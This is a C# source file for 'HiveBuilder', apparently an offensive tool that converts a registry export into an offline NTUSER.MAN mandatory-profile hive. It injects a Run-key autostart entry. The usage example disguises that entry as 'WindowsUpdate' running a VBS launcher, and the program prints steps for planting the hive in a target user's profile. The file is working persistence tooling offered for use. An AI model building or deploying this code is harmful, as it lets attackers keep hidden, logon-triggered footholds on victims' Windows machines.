using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

class HiveBuilder
{
    [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
    static extern int OROpenHive(string hivePath, out IntPtr key);

    [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
    static extern int ORCreateKey(
        IntPtr handle, string subKey, string Class, uint dwOptions,
        IntPtr securityDescriptor, out IntPtr newKey, out uint disposition);

    [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
    static extern int ORSetValue(
        IntPtr handle, string valueName, uint dwType, byte[] data, uint cbData);

    [DllImport("offreg.dll", CharSet = CharSet.Unicode)]
    static extern int ORSaveHive(IntPtr key, string hivePath, uint OsMajorVersion, uint OsMinorVersion);

    [DllImport("offreg.dll")]
    static extern int ORCloseKey(IntPtr key);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern int RegLoadAppKey(
        string lpFile, out IntPtr phkResult, uint samDesired, uint dwOptions, uint Reserved);

    [DllImport("advapi32.dll")]
    static extern int RegCloseKey(IntPtr hKey);

    const uint REG_NONE        = 0;
    const uint REG_SZ          = 1;
    const uint REG_EXPAND_SZ   = 2;
    const uint REG_BINARY      = 3;
    const uint REG_DWORD       = 4;
    const uint REG_DWORD_BIG_ENDIAN = 5;
    const uint REG_LINK        = 6;
    const uint REG_MULTI_SZ    = 7;
    const uint REG_RESOURCE_LIST = 8;
    const uint REG_FULL_RESOURCE_DESCRIPTOR = 9;
    const uint REG_RESOURCE_REQUIREMENTS_LIST = 10;
    const uint REG_QWORD       = 11;

    const uint REG_KEY_READ    = 0x20019;

    static IntPtr CreateKeyPath(IntPtr root, string keyPath)
    {
        string[] parts = keyPath.Split('\\');
        IntPtr current = root;
        foreach (string part in parts)
        {
            if (string.IsNullOrEmpty(part)) continue;
            IntPtr next; uint disp;
            int r = ORCreateKey(current, part, null, 0, IntPtr.Zero, out next, out disp);
            if (r != 0) { Console.WriteLine($"  [-] ORCreateKey '{part}' failed: 0x{r:X8}"); return IntPtr.Zero; }
            if (current != root) ORCloseKey(current);
            current = next;
        }
        return current;
    }

    static byte[] ParseHexBytes(string hexStr)
    {
        string clean = Regex.Replace(hexStr, @"\\\s*\r?\n\s*", "");
        clean = clean.Replace(" ", "").Replace("\t", "");
        string[] parts = clean.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);
        byte[] result = new byte[parts.Length];
        for (int i = 0; i < parts.Length; i++)
            result[i] = Convert.ToByte(parts[i].Trim(), 16);
        return result;
    }

    static void ImportRegFile(IntPtr hiveRoot, string regFilePath)
    {
        Console.WriteLine($"[*] Importing reg export: {regFilePath}");
        string fullFile = File.ReadAllText(regFilePath, Encoding.Unicode);
        fullFile = Regex.Replace(fullFile, @"\\\s*\r?\n\s*", "");
        string[] lines = fullFile.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);

        IntPtr currentKey = IntPtr.Zero;
        string currentKeyPath = "";
        int imported = 0, skipped = 0;

        foreach (string rawLine in lines)
        {
            string line = rawLine.Trim();
            if (string.IsNullOrEmpty(line)) continue;
            if (line.StartsWith("Windows Registry Editor")) continue;
            if (line.StartsWith(";")) continue;

            if (line.StartsWith("[") && line.EndsWith("]"))
            {
                if (currentKey != IntPtr.Zero && currentKey != hiveRoot)
                    ORCloseKey(currentKey);

                string fullPath = line.Trim('[', ']');
                if (fullPath.StartsWith("HKEY_CURRENT_USER\\", StringComparison.OrdinalIgnoreCase))
                    currentKeyPath = fullPath.Substring("HKEY_CURRENT_USER\\".Length);
                else if (fullPath.Equals("HKEY_CURRENT_USER", StringComparison.OrdinalIgnoreCase))
                    currentKeyPath = "";
                else { currentKey = IntPtr.Zero; currentKeyPath = ""; continue; }

                if (string.IsNullOrEmpty(currentKeyPath))
                    currentKey = hiveRoot;
                else
                    currentKey = CreateKeyPath(hiveRoot, currentKeyPath);
                continue;
            }

            if (currentKey == IntPtr.Zero) continue;
            if (!line.Contains("=")) continue;

            int eqIdx = line.IndexOf('=');
            string valueName = line.Substring(0, eqIdx).Trim().Trim('"');
            string valueData = line.Substring(eqIdx + 1).Trim();
            if (valueName == "@") valueName = "";

            try
            {
                if (valueData.StartsWith("\""))
                {
                    string s = valueData.Trim('"').Replace("\\\"", "\"").Replace("\\\\", "\\");
                    byte[] d = Encoding.Unicode.GetBytes(s + "\0");
                    ORSetValue(currentKey, valueName, REG_SZ, d, (uint)d.Length);
                    imported++;
                }
                else if (valueData.StartsWith("dword:"))
                {
                    uint dw = Convert.ToUInt32(valueData.Substring(6), 16);
                    byte[] d = BitConverter.GetBytes(dw);
                    ORSetValue(currentKey, valueName, REG_DWORD, d, (uint)d.Length);
                    imported++;
                }
                else if (valueData.StartsWith("hex("))
                {
                    int closeParen = valueData.IndexOf(')');
                    if (closeParen > 3)
                    {
                        string typePart = valueData.Substring(4, closeParen - 4);
                        string hexPart = valueData.Substring(closeParen + 2);
                        byte[] d = ParseHexBytes(hexPart);
                        uint regType;
                        switch (typePart)
                        {
                            case "":   regType = REG_BINARY; break;
                            case "0":  regType = REG_NONE; break;
                            case "1":  regType = REG_SZ; break;
                            case "2":  regType = REG_EXPAND_SZ; break;
                            case "3":  regType = REG_BINARY; break;
                            case "4":  regType = REG_DWORD; break;
                            case "5":  regType = REG_DWORD_BIG_ENDIAN; break;
                            case "7":  regType = REG_MULTI_SZ; break;
                            case "b": case "B": regType = REG_QWORD; break;
                            default:   regType = REG_BINARY; break;
                        }
                        ORSetValue(currentKey, valueName, regType, d, (uint)d.Length);
                        imported++;
                    }
                    else
                    {
                        byte[] d = ParseHexBytes(valueData.Substring(4));
                        ORSetValue(currentKey, valueName, REG_BINARY, d, (uint)d.Length);
                        imported++;
                    }
                }
                else
                {
                    skipped++;
                    string preview = valueData.Length > 40 ? valueData.Substring(0, 40) + "..." : valueData;
                    Console.WriteLine($"  [!] Skipped unknown format: {valueName} = {preview}");
                }
            }
            catch (Exception ex)
            {
                skipped++;
                Console.WriteLine($"  [!] Error parsing {valueName}: {ex.Message}");
            }
        }

        if (currentKey != IntPtr.Zero && currentKey != hiveRoot)
            ORCloseKey(currentKey);

        Console.WriteLine($"[+] Import complete — {imported} values imported, {skipped} skipped");
    }

    static bool AddPersistenceRunKey(IntPtr hiveHandle, string payloadPath, string keyName)
    {
        Console.WriteLine($"[*] Adding persistence Run key: {keyName}");
        string runKeyPath = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run";
        IntPtr runKeyHandle = CreateKeyPath(hiveHandle, runKeyPath);
        if (runKeyHandle == IntPtr.Zero) return false;

        byte[] valueData = Encoding.Unicode.GetBytes(payloadPath + "\0");
        int result = ORSetValue(runKeyHandle, keyName, REG_SZ, valueData, (uint)valueData.Length);
        ORCloseKey(runKeyHandle);
        if (result != 0) { Console.WriteLine($"[-] ORSetValue failed: 0x{result:X8}"); return false; }
        Console.WriteLine($"[+] Persistence value written: {keyName} = {payloadPath}");
        return true;
    }

    static string CreateBootstrapHive()
    {
        Console.WriteLine("[*] Creating bootstrap hive via RegLoadAppKey...");
        string bootstrapPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName());
        IntPtr bootstrapHandle;
        int result = RegLoadAppKey(bootstrapPath, out bootstrapHandle, REG_KEY_READ, 0, 0);
        if (result != 0) { Console.WriteLine($"[-] RegLoadAppKey failed: 0x{result:X8}"); return null; }
        RegCloseKey(bootstrapHandle);
        Console.WriteLine($"[+] Bootstrap hive created: {bootstrapPath}");
        return bootstrapPath;
    }

    static void Main(string[] args)
    {
        Console.WriteLine("╔═══════════════════════════════════════════════════════════════╗");
        Console.WriteLine("║     HiveBuilder v4 — Swarmer-compatible Hive Generator        ║");
        Console.WriteLine("║     Full registry type support (hex(b), hex(7), etc.)        ║");
        Console.WriteLine("╚═══════════════════════════════════════════════════════════════╝");
        Console.WriteLine();

        if (args.Length < 4)
        {
            Console.WriteLine("USAGE:");
            Console.WriteLine("  HiveBuilder.exe <exported.reg> <output.NTUSER.MAN> <payload_path> <key_name>");
            Console.WriteLine();
            Console.WriteLine("EXAMPLE:");
            Console.WriteLine("  HiveBuilder.exe C:\\Users\\Public\\hive_export.reg NTUSER.MAN \"wscript.exe C:\\ProgramData\\launcher.vbs\" WindowsUpdate");
            return;
        }

        string regExportPath = args[0];
        string outputHivePath = args[1];
        string payloadPath = args[2];
        string startupKeyName = args[3];

        Console.WriteLine("[*] Configuration:");
        Console.WriteLine($"    Input .reg   : {regExportPath}");
        Console.WriteLine($"    Output hive  : {outputHivePath}");
        Console.WriteLine($"    Payload      : {payloadPath}");
        Console.WriteLine($"    Key name     : {startupKeyName}");
        Console.WriteLine();

        if (!File.Exists(regExportPath))
        {
            Console.WriteLine($"[-] ERROR: Input .reg file not found: {regExportPath}");
            return;
        }

        string bootstrapPath = CreateBootstrapHive();
        if (bootstrapPath == null) return;

        Console.WriteLine("[*] Opening bootstrap hive with OROpenHive...");
        IntPtr hiveHandle;
        int result = OROpenHive(bootstrapPath, out hiveHandle);
        if (result != 0)
        {
            Console.WriteLine($"[-] OROpenHive failed: 0x{result:X8}");
            try { File.Delete(bootstrapPath); } catch { }
            return;
        }
        Console.WriteLine("[+] Hive opened successfully");

        ImportRegFile(hiveHandle, regExportPath);

        if (!AddPersistenceRunKey(hiveHandle, payloadPath, startupKeyName))
        {
            ORCloseKey(hiveHandle);
            try { File.Delete(bootstrapPath); } catch { }
            return;
        }

        Console.WriteLine($"[*] Saving hive to {outputHivePath}...");
        if (File.Exists(outputHivePath)) File.Delete(outputHivePath);
        result = ORSaveHive(hiveHandle, outputHivePath, 10, 0);
        ORCloseKey(hiveHandle);
        try { File.Delete(bootstrapPath); } catch { }

        if (result != 0)
        {
            Console.WriteLine($"[-] ORSaveHive failed: 0x{result:X8}");
            return;
        }

        FileInfo outputInfo = new FileInfo(outputHivePath);
        Console.WriteLine();
        Console.WriteLine("[✓] SUCCESS!");
        Console.WriteLine($"    File: {outputHivePath}");
        Console.WriteLine($"    Size: {outputInfo.Length / 1024} KB");
        Console.WriteLine($"    Run key: {startupKeyName} = {payloadPath}");

        if (outputInfo.Length < 10240)
            Console.WriteLine("[!] WARNING: Generated hive is very small (<10KB). The .reg import may have failed.");
        else
            Console.WriteLine("[*] Hive size looks good. Ready for deployment.");

        Console.WriteLine();
        Console.WriteLine("[*] DEPLOYMENT STEPS:");
        Console.WriteLine("    1. Ensure target user is logged out completely");
        Console.WriteLine("    2. Copy NTUSER.MAN to %USERPROFILE%\\NTUSER.MAN");
        Console.WriteLine("    3. Log in as the target user");
        Console.WriteLine("    4. Verify with: Get-Content C:\\ProgramData\\persistence_log.txt");
    }
}
